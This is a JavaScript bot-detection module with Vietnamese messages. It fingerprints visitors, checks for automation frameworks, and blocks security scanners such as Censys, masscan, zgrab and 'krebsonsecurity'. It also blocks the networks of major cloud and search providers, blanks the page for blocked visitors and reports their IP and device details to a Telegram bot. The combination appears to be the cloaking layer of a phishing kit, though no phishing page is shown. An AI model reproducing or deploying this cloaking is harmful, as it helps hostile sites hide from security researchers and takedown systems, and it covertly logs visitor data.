import config from '@/utils/config';
import axios from 'axios';
import { UAParser } from 'ua-parser-js';

const blockedKeywords = [
    'bot',
    'crawler',
    'spider',
    'headless',
    'playwright',
    'webdriver',
    'puppeteer',
    'selenium',
    'phantomjs',
    'electron',
    'http',
    'client',
    'curl',
    'wget',
    'python',
    'ruby',
    'scrapy',
    'lighthouse',
    'censysinspect',
    'krebsonsecurity',
    'ivre-masscan',
    'ahrefs',
    'semrush',
    'sistrix',
    'mailchimp',
    'mailgun',
    'larbin',
    'libwww',
    'spinn3r',
    'zgrab',
    'masscan',
    'yandex',
    'baidu',
    'sogou',
    'tweetmeme',
    'misting',
    'BotPoke',
    'google-read-aloud',
    'bytespider',
    'petalbot',
    'applebot',
    'duckduckbot',
    'facebot',
    'facebookexternalhit',
    'ia_archiver',
    'slackbot',
    'discordbot',
    'gptbot',
    'oai-searchbot',
    'anthropic-ai',
];

const blockedASNs = [15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075, 214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209, 51396, 147049];

const blockedIPs = ['95.214.55.43', '154.213.184.3'];

const sendBotTelegram = async (reason) => {
    try {
        const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
        const botToken = config.noti_token;
        const chatId = config.noti_chat_id;

        const geoRes = await axios.get(geoUrl);
        const geoData = geoRes.data;
        const fullFingerprint = {
            asn: geoData.asn,
            organization_name: geoData.organization_name,
            organization: geoData.organization,
            ip: geoData.ip,
            navigator: {
                userAgent: navigator.userAgent,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                webdriver: navigator.webdriver
            },
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            }
        };

        const msg = `🚫 <b>BOT BỊ CHẶN</b>
🔍 <b>Lý do:</b> <code>${reason}</code>

📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>

🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>

📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const payload = {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML'
        };

        await axios.post(telegramUrl, payload, {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch {
        //
    }
};

const checkAndBlockBots = async () => {
    const userAgent = navigator.userAgent.toLowerCase();
    const blockedKeyword = blockedKeywords.find((keyword) => userAgent.includes(keyword));
    if (blockedKeyword) {
        const reason = `user agent chứa keyword: ${blockedKeyword}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        try {
            window.location.href = 'about:blank';
        } catch {
            //
        }
        return { isBlocked: true, reason };
    }
    return { isBlocked: false };
};

const checkAndBlockByGeoIP = async () => {
    try {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            return { isBlocked: false };
        }

        const data = JSON.parse(ipInfo);

        if (blockedASNs.includes(Number(data.asn))) {
            const reason = `ASN bị chặn: ${data.asn}`;
            await sendBotTelegram(reason);
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
            return { isBlocked: true, reason };
        }

        if (blockedIPs.includes(data.ip)) {
            const reason = `IP bị chặn: ${data.ip}`;
            await sendBotTelegram(reason);
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
            return { isBlocked: true, reason };
        }

        return { isBlocked: false };
    } catch {
        return { isBlocked: false };
    }
};

const checkAdvancedWebDriverDetection = async () => {
    if (navigator.webdriver === true) {
        const reason = 'navigator.webdriver = true';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    if ('__nightmare' in window) {
        const reason = 'nightmare detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if ('_phantom' in window || 'callPhantom' in window) {
        const reason = 'phantom detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if ('Buffer' in window) {
        const reason = 'buffer detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if ('emit' in window) {
        const reason = 'emit detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }
    if ('spawn' in window) {
        const reason = 'spawn detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    const seleniumProps = ['__selenium_unwrapped', '__webdriver_evaluate', '__driver_evaluate', '__webdriver_script_function', '__webdriver_script_func', '__webdriver_script_fn', '__fxdriver_evaluate', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_evaluate', '__fxdriver_unwrapped'];

    const foundProp = seleniumProps.find((prop) => prop in window);
    if (foundProp) {
        const reason = `selenium property: ${foundProp}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    if ('__webdriver_evaluate' in document) {
        const reason = 'webdriver_evaluate in document';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }
    if ('__selenium_evaluate' in document) {
        const reason = 'selenium_evaluate in document';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }
    if ('__webdriver_script_function' in document) {
        const reason = 'webdriver_script_function in document';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const checkNavigatorAnomalies = async () => {
    if (navigator.webdriver === true) {
        const reason = 'navigator.webdriver = true';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency > 128) {
        const reason = `hardwareConcurrency quá cao: ${navigator.hardwareConcurrency}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) {
        const reason = `hardwareConcurrency quá thấp: ${navigator.hardwareConcurrency}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const checkScreenAnomalies = async () => {
    if (screen.width === 2000 && screen.height === 2000) {
        const reason = 'màn hình 2000x2000 (bot pattern)';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    if (screen.width > 4000 || screen.height > 4000) {
        const reason = `màn hình quá lớn: ${screen.width}x${screen.height}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if (screen.width < 200 || screen.height < 200) {
        const reason = `màn hình quá nhỏ: ${screen.width}x${screen.height}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const DOC_KEY_SUSPICIOUS_RE = /cdc_|webdriver|__fxdriver|__selenium|__driver|playwright|puppeteer|nightmare|phantom/i;

const checkAutomationDomAndWindowLeaks = async () => {
    try {
        const docKeys = Object.getOwnPropertyNames(document);
        const badDocKey = docKeys.find((k) => DOC_KEY_SUSPICIOUS_RE.test(k));
        if (badDocKey) {
            const reason = `document leak: ${badDocKey}`;
            await sendBotTelegram(reason);
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
            return { isBot: true, reason };
        }

        const winAutomationKeys = [
            'domAutomation',
            'domAutomationController',
            '__playwright_evaluation_script__',
            '__pw_manual',
            '__pwInitialize',
            '__nightmare',
            'callPhantom',
            '_phantom',
            'chromeEMU',
            'cdc_adoQpoasnfa76evfczl1fl',
        ];
        const foundWin = winAutomationKeys.find((k) => k in window);
        if (foundWin) {
            const reason = `window automation: ${foundWin}`;
            await sendBotTelegram(reason);
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
            return { isBot: true, reason };
        }
    } catch {
        //
    }
    return { isBot: false };
};

const checkWebGLSoftwareRenderer = async () => {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) {
            return { isBot: false };
        }
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (!dbg) {
            return { isBot: false };
        }
        const renderer = String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '').toLowerCase();
        const vendor = String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '').toLowerCase();
        const markers = ['swiftshader', 'llvmpipe', 'software rasterizer', 'mesa offscreen', 'microsoft basic render driver'];
        const hit = markers.find((m) => renderer.includes(m) || vendor.includes(m));
        if (hit) {
            const reason = `WebGL software/headless: ${hit} (${renderer.slice(0, 120)})`;
            await sendBotTelegram(reason);
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
            return { isBot: true, reason };
        }
    } catch {
        //
    }
    return { isBot: false };
};

const checkNavigatorFingerprintAnomalies = async () => {
    const ua = navigator.userAgent || '';
    if (ua.length < 12) {
        const reason = `user agent quá ngắn (${ua.length})`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    const maxTouch = navigator.maxTouchPoints;
    if (typeof maxTouch === 'number' && (maxTouch < 0 || maxTouch > 100)) {
        const reason = `maxTouchPoints bất thường: ${maxTouch}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    if (
        window.self === window.top &&
        typeof window.outerWidth === 'number' &&
        typeof window.innerWidth === 'number' &&
        window.outerWidth === 0 &&
        window.innerWidth > 400
    ) {
        const reason = 'outerWidth=0, innerWidth lớn (headless pattern)';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const checkChromeDriverElementAttr = async () => {
    try {
        const html = document.documentElement;
        if (!html) {
            return { isBot: false };
        }
        if (html.hasAttribute('webdriver') || html.getAttribute('webdriver') === 'true') {
            const reason = 'thẻ html có attribute webdriver (Selenium/ChromeDriver)';
            await sendBotTelegram(reason);
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
            return { isBot: true, reason };
        }
    } catch {
        //
    }
    return { isBot: false };
};

const detectBot = async () => {
    const userAgentCheck = await checkAndBlockBots();
    if (userAgentCheck.isBlocked) {
        return { isBot: true, reason: userAgentCheck.reason };
    }

    const fingerprintEarly = await checkNavigatorFingerprintAnomalies();
    if (fingerprintEarly.isBot) {
        return { isBot: true, reason: fingerprintEarly.reason };
    }

    const webDriverCheck = await checkAdvancedWebDriverDetection();
    if (webDriverCheck.isBot) {
        return { isBot: true, reason: webDriverCheck.reason };
    }

    const automationLeaks = await checkAutomationDomAndWindowLeaks();
    if (automationLeaks.isBot) {
        return { isBot: true, reason: automationLeaks.reason };
    }

    const htmlWebdriverAttr = await checkChromeDriverElementAttr();
    if (htmlWebdriverAttr.isBot) {
        return { isBot: true, reason: htmlWebdriverAttr.reason };
    }

    const webglSoft = await checkWebGLSoftwareRenderer();
    if (webglSoft.isBot) {
        return { isBot: true, reason: webglSoft.reason };
    }

    const navigatorCheck = await checkNavigatorAnomalies();
    if (navigatorCheck.isBot) {
        return { isBot: true, reason: navigatorCheck.reason };
    }

    const screenCheck = await checkScreenAnomalies();
    if (screenCheck.isBot) {
        return { isBot: true, reason: screenCheck.reason };
    }

    const geoIPCheck = await checkAndBlockByGeoIP();
    if (geoIPCheck.isBlocked) {
        return { isBot: true, reason: geoIPCheck.reason };
    }

    const obviousBotKeywords = ['googlebot', 'bingbot', 'crawler', 'spider'];
    const foundKeyword = obviousBotKeywords.find((keyword) => navigator.userAgent.toLowerCase().includes(keyword));

    if (foundKeyword) {
        return { isBot: true, reason: `obvious bot keyword: ${foundKeyword}` };
    } else {
        return { isBot: false };
    }
};

export default detectBot;

const formatBrowser = (browser) => {
    if (!browser.name) return 'Unknown Browser';
    if (browser.version) return `${browser.name} ${browser.version}`;
    return browser.name;
};

const formatOS = (os) => {
    if (!os.name) return 'Unknown OS';
    if (os.version) return `${os.name} ${os.version}`;
    return os.name;
};

const formatEngine = (engine) => {
    if (!engine.name) return null;
    if (engine.version) return `${engine.name} ${engine.version}`;
    return engine.name;
};

const getDeviceModel = (device) => {
    if (!device.vendor && !device.model) return null;
    const parts = [];
    if (device.vendor) parts.push(device.vendor);
    if (device.model) parts.push(device.model);
    return parts.join(' ');
};

const getDeviceType = (device) => {
    if (!device.type) return 'Desktop';
    return device.type.charAt(0).toUpperCase() + device.type.slice(1);
};

export const detectDevice = () => {
    try {
        if (typeof window === 'undefined' || typeof navigator === 'undefined') {
            throw new Error('Not running in browser environment');
        }

        const userAgent = navigator.userAgent;
        if (!userAgent || userAgent.length === 0) {
            throw new Error('User-Agent string is empty');
        }

        const parser = new UAParser(userAgent);
        const result = parser.getResult();

        const browserInfo = formatBrowser(result.browser);
        const osInfo = formatOS(result.os);
        const engineInfo = formatEngine(result.engine);
        const deviceModel = getDeviceModel(result.device);
        const deviceType = getDeviceType(result.device);

        const deviceBase = deviceModel || deviceType;
        const deviceInfo = `${deviceBase} - ${osInfo} - ${browserInfo}`;

        return {
            deviceType,
            os: osInfo,
            browser: browserInfo,
            model: deviceModel,
            cpu: result.cpu.architecture || null,
            engine: engineInfo,
            deviceInfo,
            userAgent,
            raw: result
        };
    } catch (error) {
        return {
            deviceType: 'Unknown',
            os: 'Unknown OS',
            browser: 'Unknown Browser',
            model: null,
            cpu: null,
            engine: null,
            deviceInfo: 'Unknown Device - Unknown OS - Unknown Browser',
            userAgent: '',
            raw: null,
            error: error.message
        };
    }
};
